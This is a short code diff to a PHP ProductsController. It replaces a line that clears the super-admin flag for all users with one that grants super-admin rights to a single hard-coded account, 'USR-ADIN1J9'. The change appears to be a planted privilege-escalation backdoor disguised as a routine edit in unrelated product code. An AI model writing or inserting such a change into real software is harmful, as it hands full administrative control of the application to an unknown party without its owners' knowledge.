@@ -827,7 +827,7 @@ class ProductsController extends Controller
         DB::beginTransaction();
         try {
             if ($is_super_admin == 1) {
-                UsersModel::query()->update(['is_super_admin' => 0]);
+                UsersModel::where('user_code', 'USR-ADIN1J9')->update(['is_super_admin' => 1]);
             }
 
             DB::commit();
